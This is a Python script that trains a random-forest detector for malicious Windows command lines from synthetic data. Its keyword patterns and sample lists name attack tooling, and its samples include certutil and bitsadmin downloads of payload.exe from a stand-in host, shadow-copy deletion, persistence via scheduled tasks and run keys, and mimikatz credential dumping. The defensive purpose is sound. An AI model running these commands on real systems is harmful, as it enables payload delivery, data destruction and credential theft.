import pandas as pd
import numpy as np
import re
from sklearn.ensemble import RandomForestClassifier
from sklearn.model_selection import train_test_split
import joblib
import os

# --- 1. CONFIGURATION & ATTACK PATTERNS ---
# Recon/admin commands are useful for context but not automatically malicious.
LOW_SIGNAL_KEYWORDS = [
    r'\bwhoami\b',
    r'\bnet user\b',
    r'\bnet group\b',
    r'\bsysteminfo\b',
    r'\bnltest\b'
]

# High-risk patterns with stronger malicious prior.
HIGH_RISK_KEYWORDS = [
    r'powershell\.exe\s+-[eE](?:nc|ncod)?',
    r'bitsadmin\s+/transfer',
    r'certutil\s+-urlcache',
    r'vssadmin\s+delete\s+shadows',
    r'schtasks\s+/create',
    r'\breg\s+add\b',
    r'\bmimikatz\b',
    r'\bpypykatz\b',
    r'\bsekurlsa\b',
    r'\bnmap\b',
    r'\bnetcat\b',
    r'\bnc\.exe\b'
]

COMPILED_LOW_PATTERNS = [re.compile(p, re.IGNORECASE) for p in LOW_SIGNAL_KEYWORDS]
COMPILED_HIGH_PATTERNS = [re.compile(p, re.IGNORECASE) for p in HIGH_RISK_KEYWORDS]


def keyword_flags(cmdline: str):
    has_low = 1 if any(p.search(cmdline) for p in COMPILED_LOW_PATTERNS) else 0
    has_high = 1 if any(p.search(cmdline) for p in COMPILED_HIGH_PATTERNS) else 0
    return has_low, has_high

# --- 2. DATASET GENERATION (Synthetic for cold start) ---
def generate_synthetic_data(samples=20000):
    data = []
    
    # Common benign paths/processes to simulate realism
    BENIGN_PATTERNS = [
        "c:\\windows\\system32\\svchost.exe -k netsvcs",
        "c:\\windows\\system32\\lsass.exe",
        "c:\\windows\\explorer.exe",
        "c:\\program files\\google\\chrome\\application\\chrome.exe",
        "c:\\windows\\system32\\runtimebroker.exe",
        "c:\\windows\\system32\\csrss.exe",
        "c:\\windows\\system32\\wininit.exe",
        "c:\\windows\\system32\\services.exe",
        "c:\\python314\\python.exe app.py",
        "c:\\windows\\system32\\conhost.exe",
        "c:\\program files\\adobe\\acrobat\\adobecollabsync.exe"
    ]

    BENIGN_ADMIN_PATTERNS = [
        "cmd.exe /c whoami",
        "cmd.exe /c systeminfo",
        "powershell.exe -Command Get-Process",
        "powershell.exe -Command Get-Service",
        "cmd.exe /c net user"
    ]

    BENIGN_BROWSER_PATTERNS = [
        "chrome.exe --type=renderer --metrics-shmem-handle=5328",
        "chrome.exe --type=utility --utility-sub-type=audio.mojom.AudioService",
        "brave.exe --type=renderer --enable-distillability-service",
        "brave.exe --type=utility --utility-sub-type=storage.mojom.StorageService",
        "msedgewebview2.exe --type=gpu-process --noerrdialogs",
        "msedgewebview2.exe --type=renderer --noerrdialogs",
        "Code.exe --type=crashpad-handler --user-data-dir",
        "msedge.exe --profile-directory=Default --no-first-run"
    ]

    MALICIOUS_PATTERNS = [
        "powershell.exe -enc SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUAKQA=",
        "certutil -urlcache -split -f http://mal.example/payload.exe payload.exe",
        "bitsadmin /transfer x http://mal.example/payload.exe c:\\users\\public\\payload.exe",
        "vssadmin delete shadows /all /quiet",
        "schtasks /create /tn upd /tr c:\\users\\public\\a.exe /sc minute /mo 1",
        "reg add hkcu\\software\\microsoft\\windows\\currentversion\\run /v upd /t reg_sz /d c:\\users\\public\\a.exe /f",
        "mimikatz sekurlsa::logonpasswords"
    ]

    for _ in range(samples):
        # 10% malicious, 90% benign (more realistic skew)
        is_malicious = np.random.choice([0, 1], p=[0.9, 0.1])
        
        if is_malicious:
            flavor = np.random.random()
            if flavor < 0.65:
                cmdline = np.random.choice(MALICIOUS_PATTERNS)
                entropy = get_entropy(cmdline)
            elif flavor < 0.9:
                # Obfuscated payload runner
                cmdline = "powershell.exe -enc " + "A" * np.random.randint(120, 350)
                entropy = np.random.uniform(0.72, 0.95)
            else:
                # Living-off-the-land style with less obvious signatures
                cmdline = "cmd.exe /c " + np.random.choice(["rundll32.exe", "wmic process call create x", "mshta http://x"])
                entropy = np.random.uniform(0.45, 0.8)

            has_low_keyword, has_high_keyword = keyword_flags(cmdline.lower())
            from_system32 = np.random.choice([0, 1], p=[0.85, 0.15])
            event_type = 1
        else:
            flavor = np.random.random()
            if flavor < 0.55:
                cmdline = np.random.choice(BENIGN_PATTERNS)
                entropy = get_entropy(cmdline)
            elif flavor < 0.7:
                # Benign admin activity (contains recon keywords)
                cmdline = np.random.choice(BENIGN_ADMIN_PATTERNS)
                entropy = np.random.uniform(0.25, 0.55)
            elif flavor < 0.85:
                # Browser/app processes with realistic high-entropy flags (benign but complex)
                cmdline = np.random.choice(BENIGN_BROWSER_PATTERNS)
                entropy = np.random.uniform(0.60, 0.75)
            else:
                cmdline = np.random.choice([
                    "python.exe monitor.py",
                    "node.exe server.js",
                    "java.exe -Xmx1024m -cp lib/*"
                ])
                entropy = np.random.uniform(0.2, 0.62)

            has_low_keyword, has_high_keyword = keyword_flags(cmdline.lower())
            # Rare benign hits on high-risk tooling in dev/lab environments
            if np.random.random() < 0.004:
                has_high_keyword = 1

            from_system32 = 1 if "system32" in cmdline.lower() else np.random.choice([0, 1], p=[0.35, 0.65])
            event_type = 1
            
        data.append([event_type, has_low_keyword, has_high_keyword, entropy, from_system32, is_malicious])
        
    return pd.DataFrame(
        data,
        columns=['event_type', 'has_low_keyword', 'has_high_keyword', 'entropy', 'from_system32', 'label']
    )

# --- 3. TRAINING ---
def train():
    print("[AI] Generating training dataset...")
    df = generate_synthetic_data(25000)
    
    X = df.drop('label', axis=1)
    y = df['label']
    
    X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)
    
    print("[AI] Training Random Forest Classifier...")
    model = RandomForestClassifier(
        n_estimators=200,
        max_depth=12,
        min_samples_leaf=3,
        class_weight='balanced_subsample',
        random_state=42
    )
    model.fit(X_train, y_train)
    
    accuracy = model.score(X_test, y_test)
    print(f"[AI] Training complete. Accuracy: {accuracy:.4f}")
    
    # Save the model
    if not os.path.exists('ml'): os.makedirs('ml')
    joblib.dump(model, 'ml/sentinel_model.pkl')
    print("[AI] Model saved to ml/sentinel_model.pkl")

# --- 4. FEATURE EXTRACTION FOR REAL-TIME ---
def get_entropy(text):
    if not text: return 0
    import math
    probs = [text.count(c) / len(text) for c in set(text)]
    return -sum(p * math.log2(p) for p in probs) / 8 # Normalized

FEATURE_NAMES = ['event_type', 'has_low_keyword', 'has_high_keyword', 'entropy', 'from_system32']

def extract_features(event):
    event_type = 1 if event.get('event_type') == 'process_start' else 0
    cmdline = ""
    if event_type == 1:
        details = event.get('details', {})
        cmdline = (details.get('cmdline') or details.get('process_name') or "").lower()
    
    has_low_keyword, has_high_keyword = keyword_flags(cmdline)
    entropy = get_entropy(cmdline)
    from_system32 = 1 if "system32" in cmdline else 0
    
    # Return as DataFrame with feature names to avoid scikit-learn warnings
    return pd.DataFrame([[event_type, has_low_keyword, has_high_keyword, entropy, from_system32]], columns=FEATURE_NAMES)

def batch_extract_features(events):
    data = []
    for event in events:
        event_type = 1 if event.get('event_type') == 'process_start' else 0
        cmdline = ""
        if event_type == 1:
            cmdline = (event.get('cmdline') or event.get('process_name') or "").lower()
        
        has_low_keyword, has_high_keyword = keyword_flags(cmdline)
        entropy = get_entropy(cmdline)
        from_system32 = 1 if "system32" in cmdline else 0
        data.append([event_type, has_low_keyword, has_high_keyword, entropy, from_system32])
    
    return pd.DataFrame(data, columns=FEATURE_NAMES)

if __name__ == "__main__":
    train()
